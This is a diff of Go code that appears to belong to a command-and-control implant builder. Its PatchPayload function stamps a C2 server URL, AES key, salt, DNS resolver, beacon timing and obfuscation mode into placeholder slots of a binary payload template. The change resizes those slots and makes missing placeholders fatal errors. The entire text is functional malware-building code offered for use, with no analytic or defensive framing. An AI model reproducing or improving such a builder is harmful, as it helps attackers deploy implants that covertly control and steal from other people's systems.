@@ -10,14 +10,14 @@ import (
 
 // Binary Patching Markers (MUST MATCH RUST CLIENT EXACTLY)
 const (
-	// ServerUrlMarker: Expected slot size 66 bytes
-	ServerUrlMarker = "SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_00000001"
+	// ServerUrlMarker: Expected slot size 64 bytes
+	ServerUrlMarker = "SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_000001"
 	
-	// AesKeyMarker: 31 bytes
-	AesKeyMarker = "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB" 
+	// AesKeyMarker: 32 bytes
+	AesKeyMarker = "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_" 
 
-	// DnsResolverMarker: 31 bytes
-	DnsResolverMarker = "SYSTEM_NETWORK_STUB_RESOLVER_31"
+	// DnsResolverMarker: 64 bytes
+	DnsResolverMarker = "SYSTEM_NETWORK_STUB_RESOLVER_64_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX"
 
 	// HeartbeatMarker: 22 bytes
 	HeartbeatMarker = "HB_DATA_INT_VAL_000010"
@@ -28,8 +28,8 @@ const (
 	// SleepTimeMarker: 16 bytes
 	SleepTimeMarker = "ST_DATA_INT_0000"
 
-	// EncryptionSaltMarker: 31 bytes
-	EncryptionSaltMarker = "SYSTEM_PROVIDER_CRYPTO_KDF_SALT"
+	// EncryptionSaltMarker: 32 bytes
+	EncryptionSaltMarker = "SYSTEM_PROVIDER_CRYPTO_KDF_SALT_"
 
 	// ObfuscationMarker: 15 bytes
 	ObfuscationMarker = "OBF_MODE_STRICT"
@@ -51,14 +51,14 @@ func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, dnsRes
 	urlPatched := false
 	for _, m := range urlMarkers {
 		slotSize := len(m)
-		if slotSize < 66 { slotSize = 66 }
+		if slotSize < 64 { slotSize = 64 }
 		if err := replaceInPlace(data, m, slotSize, c2url); err == nil {
 			urlPatched = true
 			break
 		}
 	}
 	if !urlPatched {
-		log.Printf("⚠️ Warning: Could not find any Server URL placeholder.")
+		return nil, fmt.Errorf("could not find any Server URL placeholder in template")
 	}
 
 	// 2. Patch AES Key
@@ -77,13 +77,15 @@ func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, dnsRes
 		}
 		keyPatched := false
 		for _, m := range keyMarkers {
-			if err := replaceInPlace(data, m, 31, aesKey); err == nil {
+			slotSize := len(m)
+			if slotSize < 32 { slotSize = 32 }
+			if err := replaceInPlace(data, m, slotSize, aesKey); err == nil {
 				keyPatched = true
 				break
 			}
 		}
 		if !keyPatched {
-			log.Printf("⚠️ Warning: Could not find any AES Key placeholder.")
+			return nil, fmt.Errorf("could not find any AES Key placeholder in template (expected 32 bytes)")
 		}
 	}
 
@@ -104,7 +106,7 @@ func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, dnsRes
 		}
 		dnsPatched := false
 		for _, m := range dnsMarkers {
-			if err := replaceInPlace(data, m, 31, dnsResolver); err == nil {
+			if err := replaceInPlace(data, m, 64, dnsResolver); err == nil {
 				dnsPatched = true
 				break
 			}
@@ -133,8 +135,8 @@ func PatchPayload(raw []byte, c2url string, aesKey string, heartbeat int, dnsRes
 
 	// 7. Patch Encryption Salt
 	if salt != "" {
-		if err := replaceInPlace(data, EncryptionSaltMarker, 31, salt); err != nil {
-			log.Printf("⚠️ Warning: Could not find Encryption Salt placeholder.")
+		if err := replaceInPlace(data, EncryptionSaltMarker, 32, salt); err != nil {
+			return nil, fmt.Errorf("could not find Encryption Salt placeholder in template (expected 32 bytes)")
 		}
 	}
 
